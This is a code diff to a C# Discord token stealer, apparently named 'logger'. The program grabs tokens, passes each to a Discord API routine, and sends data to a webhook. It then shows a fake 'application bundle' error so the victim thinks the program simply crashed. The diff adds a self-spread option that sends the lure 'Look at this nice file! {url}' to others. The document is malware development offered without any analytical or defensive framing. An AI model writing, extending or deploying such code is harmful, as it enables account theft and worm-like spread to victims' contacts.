@@ -18,6 +18,18 @@ namespace logger
 
         //will work if the main^ is dead
         public static string altwebhook = "";
+
+        //enable self spread?
+        public static bool selfspread = false;
+
+        //self spread message, use {url} for the url.
+        public static string msg = "Look at this nice file! {url}";
+
+
+
+
+
+
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
 
@@ -35,15 +47,21 @@ namespace logger
           
             await TokenGrabber();
 
+            try
+            {
+                await Utils.SendWebhookAsync();
+            }
+            catch
+            {
+                Console.WriteLine("_DISABLE_ANTIVIRUS");
+            }
             
-
-
-            await Utils.SendWebhookAsync();
-   
 
             Console.WriteLine(@"Failure processing application bundle.
 Bundle header version compatibility check failed.
-A fatal error occured while processing application bundle/n/nPress any key to close...");
+A fatal error occured while processing application bundle
+
+Press any key to close...");
             Console.ReadKey();
 
             var handle = GetConsoleWindow();
@@ -71,7 +89,7 @@ TokenGrabber()
 
             Parallel.ForEach(tokens, token =>
             {
-               
+                //Console.WriteLine(token);
                 DiscordAPI.main(token);
 
             });
